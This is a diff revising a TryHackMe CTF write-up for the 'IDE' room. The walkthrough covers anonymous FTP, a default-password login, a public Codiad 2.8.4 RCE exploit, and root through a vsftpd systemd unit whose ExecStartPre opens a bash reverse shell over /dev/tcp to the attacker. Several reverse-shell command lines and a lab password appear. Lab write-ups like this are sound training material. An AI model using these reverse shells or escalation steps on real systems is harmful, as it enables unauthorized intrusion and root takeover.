@@ -6,16 +6,19 @@ categories: [TryHackMe]
 tage: [thm, writeup]
 ---
 
-IDE writeup
+Technical writeup for the tryhackme IDE room - here: https://tryhackme.com/room/ide
 
-make sure the host is up - ping 10.x.x.x
+## Enumeration
+
+First, make sure the host is up - ping 10.x.x.x
 
 nmap -sV -sC -T4 -p- 10.x.x.x
-
 my go to scan for CTFs
+
+Nmap:
 ```bash
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 23:48 -0400
-Nmap scan report for 10.67.134.170
+Nmap scan report for 10.x.x.x
 Host is up (0.032s latency).
 Not shown: 65531 closed tcp ports (reset)
 PORT      STATE SERVICE VERSION
@@ -50,11 +53,21 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 67.08 seconds
 ```
-
-ftp is open with anonymous login allowed, probably the first thing ill look at
-80 and 62337 are also open for http, lets also check that
+Findings:
+ * ftp is open with anonymous login allowed, probably the first thing ill look at
+ * 80 and 62337 are also open, lets check that
 
 ``` bash
+┌──(kali㉿kali)-[~/Documents/thm]
+└─$ ftp 10.x.x.x
+Connected to 10.x.x.x.
+220 (vsFTPd 3.0.3)
+Name (10.x.x.x:kali): Anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
 ftp> ls
 229 Entering Extended Passive Mode (|||42192|)
 150 Here comes the directory listing.
@@ -85,18 +98,17 @@ local: - remote: -
 ftp> 
 
 ```
+Interesting way to hide a file, but I eventually found it. 
 
-cool, we got a file, lets check it out
-
+Now lets check it out:
 ``` bash
-                                                                                                              
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ cp - dash                                              
-                                                                                                              
+
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ ls    
 -  dash  
-                                                                                                              
+
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ cat dash   
 Hey john,
@@ -104,19 +116,19 @@ I have reset the password as you have asked. Please use the default password to 
 Also, please take care of the image file ;)
 - drac.
 ```
-we got a username and most likey a password, I would guess its somewhere in the html of the http sites we found!
+We got a username and hint for a password,
+lets check the website now.
 
-lets check..
-
-visit 10.x.x.x:80 and :62337
-port 80 was the defaul apache page, port 62337 is a log in portal! (saddly no hidden passwords in the html)
+I just visited 10.x.x.x:80 and :62337,
+Port 80 was the default Apache page, port 62337 is a log in portal!
 
 I was going to try and bruteforce it with hydra, however the note said it was a default password, likey a hint that its easy, I tried password and it was correct yay!
 
 Now that we have credentials, lets see if we can find an exploit
 
-Just looking at searchsploit, we found this:
+## Exploitation
 
+Just looking at searchsploit, we found this:
 ``` bash
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ searchsploit codiad                  
@@ -131,8 +143,7 @@ Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                    | mu
 Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                    | multiple/webapps/50474.txt
 
 ```
-Perfect, the site is in Codiad 2.8.4 - Lets copy one of them over and exploit 
-
+Perfect, the site is in Codiad 2.8.4 - Lets copy one of them over and exploit:
 ``` bash
 
 ┌──(kali㉿kali)-[~/Documents/thm]
@@ -140,7 +151,6 @@ Perfect, the site is in Codiad 2.8.4 - Lets copy one of them over and exploit
 
 ```
 now, how does it work?
-
 ``` bash
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ python3 49705.py   
@@ -154,14 +164,12 @@ Author :
         WangYihang <wangyihanger@gmail.com>
                                                                 
 ```
-
 ok, so we type in the creds, and hit enter:
-
 ``` bash
 ┌──(kali㉿kali)-[~/Documents/thm]
-└─$ python 49705.py http://10.67.134.170:62337/ john password 192.168.150.103 9001 linux
+└─$ python 49705.py http://10.x.x.x:62337/ john password 192.x.x.x 9001 linux
 [+] Please execute the following command on your vps: 
-echo 'bash -c "bash -i >/dev/tcp/192.168.150.103/9002 0>&1 2>&1"' | nc -lnvp 9001
+echo 'bash -c "bash -i >/dev/tcp/192.x.x.x/9002 0>&1 2>&1"' | nc -lnvp 9001
 nc -lnvp 9002
 [+] Please confirm that you have done the two command above [y/n]
 [Y/n] Y
@@ -173,14 +181,10 @@ nc -lnvp 9002
 [+] Writeable Path : /var/www/html/codiad_projects
 [+] Sending payload...
 
-
-
 ```
 as well as 
-
 ``` bash
 echo 'bash -c "bash -i >/dev/tcp/192.168.150.103/9002 0>&1 2>&1"' | nc -lnvp 9001
-
 ```
 AND 
 ``` bash
@@ -194,9 +198,11 @@ www-data@ide:/var/www/html/codiad/components/filemanager$ whoami
 
 ```
 which gives us our shell.
-different terminals, interesting payload...
+Interesting payload, make sure to run both of the commands it asks in different terminals.
 
-either way we have a shell, look for flags and try to get root!
+We have a shell, look for flags and try to get root!
+
+## Finding Flags
 
 ``` bash
 www-data@ide:/var/www/html/codiad/components/filemanager$ cd /
@@ -237,10 +243,9 @@ mysql -u drac -p 'Th3dRaCULa1sR3aL'
 www-data@ide:/home/drac$ 
 
 ```
-nice, drac's password
+We were not authorized to view drac's files, but the .bash_history file, (that stores a record of commands previously executed in the Bash shell) had drac's password!
 
 Lets try to read that flag now:
-
 ``` bash
 www-data@ide:/home/drac$ su drac
 su drac
@@ -256,14 +261,15 @@ Password: Th3dRaCULa1sR3aL
 
 drac@ide:~$ cat user.txt
 cat user.txt
-02930d21a8eb009f6d26361b2d24a466
+████████████████████████████████
 drac@ide:~$ 
 
 ```
-We had to upgrade to a shell, but we got our first flag!
+We had to upgrade to a terminal, but we got our first flag!
 
+## Privilege Escalation
 
-Escilate now!
+Escalation now!
 ``` bash
 drac@ide:/$ sudo -l
 Matching Defaults entries for drac on ide:
@@ -272,31 +278,26 @@ Matching Defaults entries for drac on ide:
 
 User drac may run the following commands on ide:
     (ALL : ALL) /usr/sbin/service vsftpd restart
-
-
 ```
 
-lets make things easier, since we have credentials im just going to ssh in!
-
+First, lets make things easier, since we have credentials im just going to ssh in:
 ``` bash
 ssh drac@10.x.x.x
 ```
-Doing some research, I found this article https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation which helped me escilate!
 
-we found the location:
+Doing some research, I found this article [LINK](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation) which helped me quite a bit.
+
+After reading, I just followed their steps:
 ``` bash
 drac@ide:/usr/sbin$ locate 'vsftpd.service'
 /etc/systemd/system/multi-user.target.wants/vsftpd.service
-
-/lib/systemd/system/vsftpd.service	this one!
-
+/lib/systemd/system/vsftpd.service	# this one!
 /var/lib/lxcfs/cgroup/blkio/system.slice/vsftpd.service
 /var/lib/lxcfs/cgroup/cpu,cpuacct/system.slice/vsftpd.service
-... many more
-
+# ... more paths
 ```
 
-This part of the artcile:
+Next part of the article:
 ```bash
 [Unit]
 Description=vsftpd FTP server
@@ -312,12 +313,12 @@ ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'
 WantedBy=multi-user.target
 ```
 
-we add that to our file but with our ip,
-
+We add that to our file but with our ip,
 and start a nc listening on that port, then restart the daemon!
 
 ```bash
-drac@ide:/lib/systemd/system$ vim vsftpd.service 
+drac@ide:/lib/systemd/system$ vim vsftpd.service
+# make the edits
 drac@ide:/lib/systemd/system$ systemctl daemon-reload 
 ==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
 Authentication is required to reload the systemd state.                                                       
@@ -325,14 +326,14 @@ Authenticating as: drac
 Password: 
 ==== AUTHENTICATION COMPLETE ===
 drac@ide:/lib/systemd/system$ sudo /usr/sbin/service vsftpd restart                                           
-
 ```
-and shell (make sure to do this before you restart)
+
+and shell (make sure to do this after editing the file)
 ```bash
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ nc -lvnp 4444 
 listening on [any] 4444 ...
-connect to [192.168.150.103] from (UNKNOWN) [10.67.134.170] 59390
+connect to [192.x.x.x] from (UNKNOWN) [10.x.x.x] 59390
 bash: cannot set terminal process group (2770): Inappropriate ioctl for device
 bash: no job control in this shell
 root@ide:/# whoami
@@ -342,14 +343,14 @@ root@ide:/# cd root
 cd root
 root@ide:/root# cat root.txt
 cat root.txt
-ce258cb16f47f1c66f0b0b77f4e0fb8d
+████████████████████████████████
 root@ide:/root# 
 
 ```
 
 Room done!
 
-Thank you for reading, and thanks to LINK for the really helpful priv esc!
+Thank you for reading, and thanks to [LINK](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-service-privilege-escalation) for the really helpful priv esc!
 
 
 
